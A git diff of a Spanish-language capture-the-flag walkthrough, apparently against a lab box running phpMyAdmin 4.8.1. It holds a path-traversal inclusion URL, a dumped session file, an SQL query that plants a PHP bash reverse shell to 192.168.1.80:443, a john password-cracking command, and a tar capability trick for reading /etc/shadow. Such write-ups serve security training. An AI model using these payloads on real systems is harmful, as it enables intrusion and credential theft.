@@ -689,7 +689,6 @@ http://datasafe.votenow.local/index.php?target=db_sql.php%253f../../../../../../
 
 ![session_file.png](session_file.png)
 
-
 ```
 PMA_token |s:16:"y/)Hw1x2gITZ--tq";browser_access_time|a:1:{s:7:"default";i:1675460312;}relation|a:1:{i:1;a:22:{s:11:"PMA_VERSION";s:5:"4.8.1";s:7:"relwork";b:0;s:11:"displaywork";b:0;s:12:"bookmarkwork";b:0;s:7:"pdfwork";b:0;s:8:"commwork";b:0;s:8:"mimework";b:0;s:11:"historywork";b:0;s:10:"recentwork";b:0;s:12:"favoritework";b:0;s:11:"uiprefswork";b:0;s:12:"trackingwork";b:0;s:14:"userconfigwork";b:0;s:9:"menuswork";b:0;s:7:"navwork";b:0;s:17:"savedsearcheswork";b:0;s:18:"centralcolumnswork";b:0;s:20:"designersettingswork";b:0;s:19:"exporttemplateswork";b:0;s:8:"allworks";b:0;s:4:"user";N;s:2:"db";N;}}cache|a:2:{s:16:"server_1_votebox";a:16:{s:14:"mysql_cur_user";s:9:"votebox@%";s:17:"is_create_db_priv";b:1;s:14:"is_reload_priv";b:0;s:12:"db_to_create";s:8:"votebox_";s:30:"dbs_where_create_table_allowed";a:2:{i:0;s:7:"votebox";i:1;s:10:"votebox\_%";}s:11:"dbs_to_test";a:6:{i:0;s:18:"information_schema";i:1;s:18:"performance_schema";i:2;s:5:"mysql";i:3;s:3:"sys";i:4;s:7:"votebox";i:5;s:10:"votebox\_%";}s:9:"proc_priv";b:0;s:10:"table_priv";b:0;s:8:"col_priv";b:0;s:7:"db_priv";b:0;s:12:"is_superuser";b:0;s:12:"is_grantuser";b:0;s:13:"is_createuser";b:0;s:11:"binary_logs";a:0:{}s:18:"menu-levels-server";a:13:{s:9:"databases";s:9:"Databases";s:3:"sql";s:3:"SQL";s:6:"status";s:6:"Status";s:6:"rights";s:5:"Users";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:8:"settings";s:8:"Settings";s:6:"binlog";s:10:"Binary log";s:11:"replication";s:11:"Replication";s:4:"vars";s:9:"Variables";s:7:"charset";s:8:"Charsets";s:7:"plugins";s:7:"Plugins";s:6:"engine";s:7:"Engines";}s:14:"menu-levels-db";a:14:{s:9:"structure";s:9:"Structure";s:3:"sql";s:3:"SQL";s:6:"search";s:6:"Search";s:17:"multi_table_query";s:5:"Query";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:9:"operation";s:10:"Operations";s:10:"privileges";s:10:"Privileges";s:8:"routines";s:8:"Routines";s:6:"events";s:6:"Events";s:8:"triggers";s:8:"Triggers";s:8:"tracking";s:8:"Tracking";s:8:"designer";s:8:"Designer";s:15:"central_columns";s:15:"Central columns";}}s:8:"server_1";a:3:{s:15:"userprefs_mtime";i:1675459715;s:14:"userprefs_type";s:7:"session";s:12:"config_mtime";i:1527216327;}}encryption_key|s:32:"��U��N�9e�������ǁ @ ��Z'�zC�";userconfig|a:2:{s:2:"db";a:1:{s:12:"Console/Mode";s:8:"collapse";}s:2:"ts";i:1675460312;}two_factor_check|b:1;tmpval|a:4:{s:13:"recent_tables";a:1:{i:1;a:0:{}}s:15:"favorite_tables";a:1:{i:1;a:0:{}}s:18:"table_limit_offset";i:0;s:21:"table_limit_offset_db";s:7:"votebox";}ConfigFile1|a:2:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}s:7:"Servers";a:1:{i:1;a:2:{s:7:"only_db";s:0:"";s:7:"hide_db";s:0:"";}}}debug|a:0:{}prev_errors|a:2:{s:32:"bb41f23841f9ba0f9103b0754c581d2e";O:16:"PhpMyAdmin\Error":12:{s:7:"*file";s:11:"./index.php";s:7:"*line";i:61;s:12:"*backtrace";a:1:{i:0;a:3:{s:4:"file";s:11:"./index.php";s:4:"line";i:61;s:8:"function";s:7:"include";}}s:16:"*hide_location";b:0;s:9:"*number";i:2;s:9:"*string";s:0:"";s:10:"*message";s:180:"include(db_sql.php%3f../../../../../../../..//var/lib/php/session/sess_/var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5): failed to open stream: No such file or directory";s:14:"*isDisplayed";b:1;s:12:"*useBBCode";b:0;s:7:"*hash";s:32:"bb41f23841f9ba0f9103b0754c581d2e";s:9:"*params";a:0:{}s:16:"*addedMessages";a:0:{}}s:32:"a1caf3838ae18c595102062e210029d2";O:16:"PhpMyAdmin\Error":12:{s:7:"*file";s:11:"./index.php";s:7:"*line";i:61;s:12:"*backtrace";a:1:{i:0;a:3:{s:4:"file";s:11:"./index.php";s:4:"line";i:61;s:8:"function";s:7:"include";}}s:16:"*hide_location";b:0;s:9:"*number";i:2;s:9:"*string";s:0:"";s:10:"*message";s:213:"include(): Failed opening 'db_sql.php%3f../../../../../../../..//var/lib/php/session/sess_/var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5' for inclusion (include_path='.:/usr/share/pear:/usr/share/php')";s:14:"*isDisplayed";b:1;s:12:"*useBBCode";b:0;s:7:"*hash";s:32:"a1caf3838ae18c595102062e210029d2";s:9:"*params";a:0:{}s:16:"*addedMessages";a:0:{}}}errors|a:0:{}
 ```
@@ -710,7 +709,10 @@ Eso significa que si en vez de esa instrucción de php, inyectamos otro payload,
 
 Cerramos y abrimos la sesión para renovar la cookie, y añadimos la siguiente query:
 
+
+```sql
 SELECT '<?PHP system(urldecode("bash%20-c%20%22/bin/bash%20-i%20%26%3e%20/dev/tcp/192.168.1.80/443%200%3e%261%22")); ?>'
+```
 
 Como la linea de la reverse shell está completamente urlencodeada, no será entendida a menos que la decodifiquemos con urldecode.
 
@@ -797,7 +799,9 @@ Si recordamos, en la base de datos habíamos conseguido acceder a los datos de u
 
 Por fuerza bruta podemos averiguar si ese hash es algún password de los que figuran en Rockyou.
 
+```bash
 > john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 ![johntheripper.png](johntheripper.png)
 
@@ -805,8 +809,10 @@ Por fuerza bruta podemos averiguar si ese hash es algún password de los que fig
 
 Y vemos que hay una coincidencia Stella. Probamos a cambiar de usuario a admin.
 
+```bash
 > su admin
 password: Stella
+```
 
 Y bingo! escalamos privilegios a admin.
 
@@ -885,7 +891,6 @@ https://man7.org/linux/man-pages/man7/capabilities.7.html
 
 Como podemos ver, esta capability permite saltarse los permisos de lectura de ficheros y diretorio
 por ese motivo podemos probar varias cosas, como leer del directorio root, o del fichero /etc/shadow
-
 
 ```bash
 > tarS -A /etc/shadow -f pepe.tar
